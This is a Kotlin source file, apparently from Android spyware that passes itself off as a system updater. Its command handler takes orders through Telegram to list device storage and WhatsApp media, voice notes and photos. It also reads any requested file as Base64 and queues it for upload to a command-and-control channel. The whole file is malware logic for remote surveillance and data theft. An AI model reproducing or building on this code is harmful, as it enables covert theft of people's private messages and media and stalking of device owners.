package com.android.systemservice.updater

import android.util.Base64
import org.json.JSONArray
import org.json.JSONObject

object CommandHandler {

    fun handleTelegramCommand(text: String): String? {
        val parts = text.trim().split(" ")
        val cmd = parts[0].lowercase()
        val arg = parts.drop(1).joinToString(" ")

        return when (cmd) {
            "/list" -> FileBrowser.listDirectory(arg.ifBlank { "/storage/emulated/0/" })
            "/whatsapp" -> FileBrowser.whatsAppMediaList()
            "/voice" -> FileBrowser.whatsAppVoiceNotes()
            "/photos" -> FileBrowser.whatsAppImages()
            "/get" -> {
                val result = FileBrowser.readFileAsBase64(arg)
                if (result == null) "❌ Cannot read file: $arg"
                else {
                    C2Queue.enqueueUrgent(JSONObject().apply {
                        put("type", "file_upload")
                        put("name", result.first)
                        put("data", result.second)
                        put("ts", System.currentTimeMillis())
                    }.toString())
                    "📤 Uploading: ${result.first}"
                }
            }
            else -> null
        }
    }
}
